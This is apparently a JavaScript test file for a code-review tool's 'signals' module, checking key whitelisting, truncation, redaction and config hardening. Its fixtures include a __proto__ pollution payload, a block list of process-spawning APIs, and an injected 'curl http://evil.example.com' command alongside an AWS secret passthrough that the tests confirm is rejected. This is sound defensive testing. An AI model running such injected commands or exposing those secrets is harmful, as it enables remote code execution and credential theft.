import test from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import {
  SIGNAL_KEYS,
  normalizeSignals,
  tailTruncate,
  readSignalsFile,
  collectSignals,
} from '../scripts/lib/signals.mjs'
import { buildPayload, LIMITS } from '../scripts/lib/context.mjs'
import { applyProjectConfig, CONFIG_DEFAULTS } from '../scripts/lib/config.mjs'

test('normalizeSignals keeps only whitelisted non-empty strings', () => {
  const out = normalizeSignals({
    failing_tests: '3 failed',
    lint: '  ',
    notes: 'ok',
    evil: 'drop me',
    numeric: 12,
  })
  assert.deepEqual(Object.keys(out), ['failing_tests', 'notes'])
  assert.equal(out.failing_tests, '3 failed')
})

test('normalizeSignals returns null when nothing survives', () => {
  assert.equal(normalizeSignals({ evil: 'x' }), null)
  assert.equal(normalizeSignals(null), null)
  assert.equal(normalizeSignals([]), null)
  assert.equal(normalizeSignals('failing_tests'), null)
})

test('normalizeSignals cannot be steered by __proto__ in a signals file', () => {
  const out = normalizeSignals(JSON.parse('{"failing_tests":"x","__proto__":{"polluted":true}}'))
  assert.deepEqual(Object.keys(out), ['failing_tests'])
  assert.equal({}.polluted, undefined)
})

// --- truncation ---

test('tailTruncate keeps the tail, where the failures are', () => {
  const text = `${'a'.repeat(LIMITS.signal)}FAILED: the answer`
  const out = tailTruncate(text)
  assert.ok(out.endsWith('FAILED: the answer'))
  assert.ok(out.startsWith('… [truncated'))
})

test('tailTruncate never exceeds the payload cap', () => {
  for (const extra of [1, 34, 999, 500_000]) {
    const out = tailTruncate('x'.repeat(LIMITS.signal + extra))
    assert.ok(
      out.length <= LIMITS.signal,
      `overshoot by ${out.length - LIMITS.signal} for +${extra}`,
    )
  }
})

test('tailTruncate leaves short text untouched', () => {
  assert.equal(tailTruncate('short'), 'short')
})

// The composition is the thing that actually matters, and the thing an
// earlier version got wrong: tailTruncate kept the tail, overshot the cap by
// the length of its own notice, and buildPayload's head-truncation then cut
// exactly the tail back off.
test('an oversized signal survives buildPayload with its tail intact', () => {
  const text = `${'noise\n'.repeat(20_000)}FAILED: 3 tests failed <-- THE ANSWER`
  const { payload } = buildPayload({
    kind: 'review',
    goal: 'g',
    diff: 'd',
    signals: normalizeSignals({ failing_tests: text }),
  })
  const out = payload.signals.failing_tests
  assert.ok(out.endsWith('FAILED: 3 tests failed <-- THE ANSWER'), 'the tail must reach the payload')
  assert.ok(out.length <= LIMITS.signal)
  assert.ok(!out.includes('truncated 34 chars'), 'buildPayload must not have truncated again')
})

// --- reading a caller-supplied file ---

test('readSignalsFile rejects unparseable and key-less files', () => {
  assert.throws(() => readSignalsFile('/x', { readFileFn: () => 'not json' }), /could not read/)
  assert.throws(() => readSignalsFile('/x', { readFileFn: () => '{"evil":"x"}' }), /no usable keys/)
})

test('readSignalsFile normalizes a valid file', () => {
  const out = readSignalsFile('/x', {
    readFileFn: () => JSON.stringify({ failing_tests: '2 failed', evil: 'x' }),
  })
  assert.deepEqual(out, { failing_tests: '2 failed' })
})

test('an unreadable --signals path is an error, not a silent empty review', () => {
  // Degrading here would send a review with no evidence while the caller
  // believed the file had travelled.
  assert.throws(
    () => collectSignals({ signalsPath: '/definitely/not/here.json', readSignalsFileFn: readSignalsFile }),
    /could not read/,
  )
})

// --- precedence ---

test('collectSignals: --no-signals wins over an explicit file', () => {
  const out = collectSignals({
    disabled: true,
    signalsPath: '/x',
    readSignalsFileFn: () => assert.fail('must not read'),
  })
  assert.deepEqual(out, { signals: null })
})

test('collectSignals yields nothing when no file is given', () => {
  assert.deepEqual(collectSignals({}), { signals: null })
})

test('collectSignals returns the normalized file contents', () => {
  const out = collectSignals({ signalsPath: '/given', readSignalsFileFn: () => ({ notes: 'n' }) })
  assert.deepEqual(out.signals, { notes: 'n' })
})

// --- the boundary ---

test('the bridge spawns no process to produce signals', () => {
  // The whole point of the current design: evidence is handed over, never
  // collected by executing the reviewed repository's own command.
  const source = readFileSync(new URL('../scripts/lib/signals.mjs', import.meta.url), 'utf8')
  for (const forbidden of ['child_process', 'execFile', 'spawn', 'testCommand:']) {
    assert.ok(!source.includes(forbidden), `signals.mjs must not reference ${forbidden}`)
  }
})

test('signals ride the normal outbound redaction path', () => {
  const { payload } = buildPayload({
    kind: 'review',
    goal: 'g',
    diff: 'd',
    signals: { failing_tests: 'expected AKIAIOSFODNN7EXAMPLE in output' },
  })
  assert.ok(!payload.signals.failing_tests.includes('AKIAIOSFODNN7EXAMPLE'))
  assert.match(payload.signals.failing_tests, /REDACTED/)
})

test('payload signal keys and the module whitelist stay in agreement', () => {
  const { payload } = buildPayload({
    kind: 'review',
    goal: 'g',
    diff: 'd',
    signals: Object.fromEntries(SIGNAL_KEYS.map((k) => [k, 'x'])),
  })
  assert.deepEqual(Object.keys(payload.signals).sort(), [...SIGNAL_KEYS].sort())
})

test('a repository config still cannot widen anything', () => {
  const merged = applyProjectConfig({ ...CONFIG_DEFAULTS }, {
    signals: { testCommand: ['curl', 'http://evil.example.com'] },
    envPassthrough: ['AWS_SECRET_ACCESS_KEY'],
    redaction: { excludeFiles: ['secrets/**'] },
  })
  assert.equal(merged.signals, undefined, 'no executable command may enter the config at all')
  assert.deepEqual(merged.envPassthrough, [], 'the env allowlist stays closed')
  assert.ok(merged.redaction.excludeFiles.includes('secrets/**'), 'tightening still applies')
})
